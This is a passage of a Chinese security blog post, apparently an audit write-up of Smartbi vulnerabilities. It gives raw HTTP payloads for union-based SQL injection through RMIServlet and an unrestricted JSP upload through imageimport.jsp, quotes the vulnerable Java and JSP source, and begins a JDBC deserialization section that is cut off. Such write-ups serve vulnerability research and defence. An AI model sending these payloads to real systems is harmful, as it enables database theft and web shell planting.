class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">           conn </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ConnectionPool</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(info);</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;select c_userpwd from t_user where c_username=?&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">           prep </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">conn</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">prepareStatement</span><span style="color: #ABB2BF">(sql);</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">prep</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setString</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, username);</span></span><span class="line"><span style="color: #E06C75">           rs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">prep</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">executeQuery</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">               </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> pass </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;c_userpwd&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">               loginSucceed </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> pass </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">pass</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(password);</span></span><span class="line"><span style="color: #E06C75">           }</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">prep</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">       } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">log</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getLanguageValue</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Unabletoaccessdata&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;: &quot;</span><span style="color: #ABB2BF">, e);</span></span><span class="line"><span style="color: #E06C75">       } </span><span style="color: #C678DD">finally</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">closeDBObject</span><span style="color: #ABB2BF">(rs, prep, conn);</span></span><span class="line"><span style="color: #E06C75">       }</span></span></code></pre></div></div></figure></li></ol><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><h4 id="payload：（1）"><a href="#payload：（1）" class="headerlink" title="payload：（1）"></a>payload：（1）</h4><p>发包，直接获取数据库名（报错注入）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173432983.png" alt="image-20250811215840293"></p><h4 id="漏洞分析：（1）"><a href="#漏洞分析：（1）" class="headerlink" title="漏洞分析：（1）"></a>漏洞分析：（1）</h4><ol><li><p>smartbi&#x2F;vision&#x2F;FileResource（从名称入手）</p><p>寻找FileResource相关的文件名称<strong>FileResourceServlet</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173434902.png" alt="image-20250811213747684"></p><p>从 doGet ⽅法中，利用request.getParameter(“resId”) 获取resId参数，拼接到sql语句执行<strong>（没有使⽤预编译处理）</strong></p></li><li><p>在web.xml查看相关路径的代码</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;FileResource&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;smartbi.freequery.fileresource.FileResourceServlet&lt;/</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">servlet</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;FileResource&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;/vision/FileResource&lt;/</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>执⾏sql语句报错后，会将报错信息返回给客户端并弹窗提示，因此我们可以通过报错来进⾏注⼊</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173437858.png" alt="image-20250811215709280"></p></li></ol><h4 id="payload：（2）"><a href="#payload：（2）" class="headerlink" title="payload：（2）"></a>payload：（2）</h4><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:127.0.0.1:18080</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Macintosh; </span><span style="color: #61AFEF">Intel</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mac</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">OS</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">X</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10</span><span style="color: #98C379">_14_3</span><span style="color: #ABB2BF">) AppleWebKit/60</span></span><span class="line"><span style="color: #61AFEF">5.1.15</span><span style="color: #ABB2BF"> (KHTML, </span><span style="color: #98C379">like</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Gecko</span><span style="color: #ABB2BF">) Version/12.0.3 Safari/605.1.15</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=</span><span style="color: #D19A66">66</span><span style="color: #98C379">D3B217CBE76A3BB32C771E6EB6429C</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">99</span></span><span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UrlLinkService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">getFileResource</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[&quot;1&#39;union selec</span></span><span class="line"><span style="color: #98C379">t database(),2,3,4,5,6#&quot;]</span></span></code></pre></div></div></figure><p>抓包，使用union联合注入（有回显）（报错，盲注）</p><h4 id="漏洞分析：（2）"><a href="#漏洞分析：（2）" class="headerlink" title="漏洞分析：（2）"></a>漏洞分析：（2）</h4><ol><li><p>FileResourceDAO 中 getFileResource ⽅法中，这⾥我们看到 id参数为String类型，并且直接拼接到sql语句中并执⾏</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173440049.png" alt="image-20250811224500461"></p></li><li><p>跟近getFileResource，在 URLLinkService 的 getFileResource被调用</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FileResource</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getFileResource</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> fileResourceID) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FileResourceDAO</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getFileResource</span><span style="color: #ABB2BF">(fileResourceID);</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173441869.png" alt="image-20250811225032944"></p><p>存在 URLLinkService类，这代表我们可以通过反射调⽤该⽅法的任意类，同时参数可控</p></li></ol><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a><strong>payload：</strong></h4><ol><li><p>这是一个后台漏洞，需要登录获取⽤户Cookie</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173442903.png" alt="image-20250811220431605"></p></li><li><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/designer/imageimport.jsp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1:18080</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:52.0</span><span style="color: #ABB2BF">) Gecko/20100</span></span><span class="line"><span style="color: #61AFEF">101</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Firefox/52.0</span></span><span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">text/html,application/xhtml+xml,application/xml</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.9</span><span style="color: #98C379">,</span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span></span><span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate</span></span><span class="line"><span style="color: #61AFEF">X-File-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">image</span></span><span class="line"><span style="color: #61AFEF">X-File-Name:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #98C379">.jsp</span></span><span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">close</span></span><span class="line"><span style="color: #61AFEF">Upgrade-Insecure-Requests:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">multipart/form-data</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">boundary</span><span style="color: #56B6C2">=</span><span style="color: #98C379">---------------------------292</span></span><span class="line"><span style="color: #61AFEF">7288396864</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">FQPassword=</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">JSESSIONID</span><span style="color: #56B6C2">=</span><span style="color: #98C379">AE628E59E970577DD994954A693517C8</span></span><span class="line"><span style="color: #ABB2BF">&lt;%=</span><span style="color: #98C379">&quot;CurlySean&quot;</span><span style="color: #ABB2BF">%&gt;</span></span></code></pre></div></div></figure></li><li><p>访问&#x2F;smartbi&#x2F;vision&#x2F;designer&#x2F;image&#x2F;1.jsp</p><p>发现出现CurlySean</p></li></ol><h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>smartbi&#x2F;vision&#x2F;designer&#x2F;imageimport.jsp ⽂件</p><p>Smartbi\Tomcat\webapps\smartbi\vision\designer\imageimport.jsp</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.io.*&quot;</span><span style="color: #56B6C2">%&gt;</span></span><span class="line"><span style="color: #56B6C2">&lt;%</span></span><span class="line"><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> path </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getServletContext</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getRealPath</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/vision/designer/images/&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">File</span><span style="color: #E06C75"> dir </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">File</span><span style="color: #E06C75">(path)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">dir</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">exists</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">dir</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">mkdirs</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> fileName </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">String</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getHeader</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;X-File-Name&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ISO-8859-1&quot;</span><span style="color: #ABB2BF">),</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> fileType </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getHeader</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;X-File-Type&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">if</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">fileType</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">indexOf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;image&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setContentType</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;text/html; charset=UTF-8&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">resetBuffer</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOutputStream</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;error file type!&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">File</span><span style="color: #E06C75"> file </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">File</span><span style="color: #E06C75">(path </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> fileName)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">FileOutputStream</span><span style="color: #E06C75"> fos </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #E06C75">(file)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">int</span><span style="color: #E06C75"> bytesRead</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] buf </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[</span><span style="color: #D19A66">1024</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">// 4K buffer</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">while</span><span style="color: #E06C75"> ((bytesRead </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">(buf)</span><span style="color: #E06C75">) </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">fos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(buf, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, bytesRead);</span></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">fos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">fos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">smartbi</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">net</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">sf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">json</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">JSONObject</span><span style="color: #E06C75"> jobj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> smartbi</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">net</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">sf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">json</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">JSONObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">jobj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;url&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">path</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">substring</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">path</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">lastIndexOf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;images/&quot;</span><span style="color: #ABB2BF">)) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> fileName);</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #7F848E; font-style: italic">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">jobj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setContentType</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;text/html; charset=UTF-8&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">resetBuffer</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOutputStream</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">resultStr</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">} </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure><p>通过拼接获取⽂件上传的路径，没有则创建 </p><p>从请求头重获取 X-File-Name 作为⽂件名，判断 X-File-Type 是否以 image 开头，不是则 报错 </p><p>从请求体中读取输⼊流，写⼊⽂件中</p><p>（对⽂件的后缀和内容没有任何过滤，直接上传Jsp⽂件即可）</p></li></ol><h2 id="SmartBi-JDBC反序列化"><a href="#SmartBi-JDBC反序列化" class="headerlink" title="SmartBi-JDBC反序列化"></a>SmartBi-JDBC反序列化</h2><h4 id="payload：-2"><a href="#payload：-2" class="headerlink" title="payload："></a><strong>payload：</strong></h4><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 